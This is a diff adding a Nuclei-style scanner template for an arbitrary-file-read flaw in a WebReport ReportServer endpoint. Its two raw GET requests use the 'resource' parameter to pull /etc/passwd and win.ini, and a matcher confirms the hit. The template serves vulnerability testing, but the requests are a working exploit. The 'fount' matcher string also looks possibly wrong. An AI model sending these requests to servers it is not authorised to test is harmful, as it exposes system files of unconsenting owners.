@@ -1,0 +1,25 @@
+id: zfjxgl-reportserver-anyfileread
+
+info:
+  name: zfjxgl-reportserver-anyfileread
+  author: HB
+  severity: high
+
+http:
+  - raw:
+    - | 
+      GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    - |
+      GET /WebReport/ReportServer?op=resource&resource=C:\Windows\win.ini&i18n=true HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+         - status_code==200 && contains_all(body,"root") || contains_all(body_2,"fount")
